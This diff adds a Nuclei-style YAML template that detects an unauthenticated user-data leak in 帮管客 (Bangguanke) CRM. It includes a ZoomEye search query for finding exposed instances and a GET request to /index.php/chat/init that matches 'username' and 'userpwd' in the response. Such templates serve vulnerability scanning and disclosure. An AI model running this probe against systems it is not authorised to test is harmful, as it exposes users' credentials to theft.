@@ -1,0 +1,28 @@
+id: bangguan-info-leak
+
+info:
+  name: "帮管客 CRM 用户信息暴露漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: ZoomEye语法：app:"帮管客CRM"
+          帮管客CRM是一款集成移动办公、客户关系管理及即时通讯功能的企业级智能化管理系统，支持多形态部署模式。该系统在销售流程跟踪、服务智能化管理及数据可视化分析等方面提供完整解决方案。经检测发现用户敏感数据可通过非授权接口获取。
+  tags: 帮管客
+
+http:
+- raw:
+  - |
+    GET /index.php/chat/init HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'username'
+  - type: word
+    part: body
+    words:
+    - 'userpwd'
